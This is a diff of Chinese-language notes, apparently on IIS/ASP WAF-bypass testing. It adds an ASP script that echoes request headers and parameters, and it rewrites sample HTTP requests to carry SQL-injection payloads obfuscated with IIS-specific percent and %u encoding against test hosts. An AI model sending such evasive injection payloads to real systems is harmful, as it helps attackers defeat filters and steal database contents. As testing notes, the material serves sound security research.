@@ -370,7 +370,26 @@ Content-Disposition: form-data; name="file";filename="shell.php"
 
 ```asp
 <%
-	Response.Write(Request.QueryString("id"))  
+	Response.Write("charseki.chen@dbappsecurity.com.cn")
+	Response.Write(CHR(10) & CHR(10)
+                 
+  //打印Headers信息
+	Response.Write("---------------- Headers ----------------" & CHR(10) & CHR(10))
+	Response.Write(Request.ServerVariables("ALL_RAW"))
+	Response.Write(CHR(10) & CHR(10))
+                 
+  //打印QueryString信息
+	Response.Write("--------------- QueryString --------------" & CHR(10) & CHR(10))
+	for Each n in Request.QueryString()
+		Response.Write "[" & n & "]" & " => " & "[" & Request.QueryString(n) & "]" & CHR(10)
+		Next	
+	Response.Write(CHR(10) & CHR(10))
+                 
+  //打印Form信息
+	Response.Write("------------------ Form ------------------" & CHR(10) & CHR(10))
+	for Each n in Request.Form()
+		Response.Write "[" & n & "]" & " => " & "[" & Request.Form(n) & "]" & CHR(10)
+		Next
 %>
 ```
 
@@ -381,20 +400,17 @@ http://test.iis6.com/charseki.asp
 ### 报文示例
 
 ```
-GET /charseki.asp?id=1+union+select+1,2,3 HTTP/1.1
+POST /charseki.asp?aaa=1+union+se%lect+1,2,3,4+fro%m+adm%in HTTP/1.1
 Host: test.iis6.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Connection: close
-Upgrade-Insecure-Requests: 1
-Cache-Control: max-age=0
-Content-Length: 2
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/3.0 (compatible; Indy Library)
+Accept: text/html, */*
+Content-Length: 48
 
+bbb=1+union+%u0053elect+1,2,3,4,+%u0066rom+admin
 ```
 
-![image-20230112105308709](static/img/63bf7616be43e0d30e465a56.png)
+![image-20230112105308709](static/img/63f4a4eff144a01007756bc1.png)
 
 ## 0x07 IIS7.5+Asp(x)
 
@@ -458,17 +474,17 @@ http://test.iis7.com/charseki.aspx
 ### 报文示例
 
 ```
-POST /charseki.aspx?aaa=123456789&bbb=987654321 HTTP/1.1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 61
+POST /charseki.aspx?aaa=1+union+se%lect+1,2,3,4+fro%m+adm%in HTTP/1.1
 Host: test.iis7.com
-Accept: text/html, */*
+Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/3.0 (compatible; Indy Library)
+Accept: text/html, */*
+Content-Length: 48
 
-id=1'%20union%20select%201,2,3#&uname=admin&passwd=Admin@1234
+bbb=1+union+%u0053elect+1,2,3,4,+%u0066rom+admin
 ```
 
-![image-20230112105349321](static/img/63bf763ebe43e0d30e46904f.png)
+![image-20230112105349321](static/img/63f4a5a1f144a01007766c57.png)
 
 ### aspx源码（文件上传）
 
